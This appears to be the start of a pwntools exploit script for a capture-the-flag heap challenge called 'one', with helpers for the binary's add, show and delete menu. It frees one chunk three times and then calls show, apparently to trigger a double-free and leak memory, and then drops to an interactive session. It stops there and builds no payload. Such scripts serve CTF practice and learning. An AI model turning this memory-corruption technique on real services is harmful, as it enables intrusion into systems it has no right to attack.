#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./one"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
        loadsym
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def add(buf):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('>')
    p.sendline(buf)

def show():
    p.recvuntil('>')
    p.sendline('2')

def delete():
    p.recvuntil('>')
    p.sendline('3')

add(b'DUMMY')
for _ in range(3):
    delete()
show()

p.interactive()
